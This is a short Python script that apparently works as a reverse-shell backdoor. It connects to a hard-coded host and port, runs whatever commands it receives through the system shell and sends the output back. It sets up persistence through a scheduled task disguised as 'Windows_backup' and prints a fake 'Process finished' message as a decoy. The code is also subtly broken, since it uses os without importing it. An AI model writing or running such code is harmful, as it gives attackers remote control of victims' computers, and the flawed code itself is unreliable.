import socket
import subprocess


REMOTE_PORT = 1111
client = socket.socket()
client.connect(('192.168.254.103', REMOTE_PORT))
print('Process finished with exit code 0')
while True:
    # os.system('cmd /c "SCHTASKS /CREATE /SC DAILY / TN "PYTHON\Windows_backup" /TR '
    #           '"C:\Users\user\Downloads\ygame\Windows_backup.py" /ST 10:00"')
    os.system('cmd /c "schtasks /create /tn "Windows_backup" /sc minute /mo 5 /tr'
              ' C:\Users\user\Downloads\ygame\Windows_backup.py"')
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    client.send(output + output_error)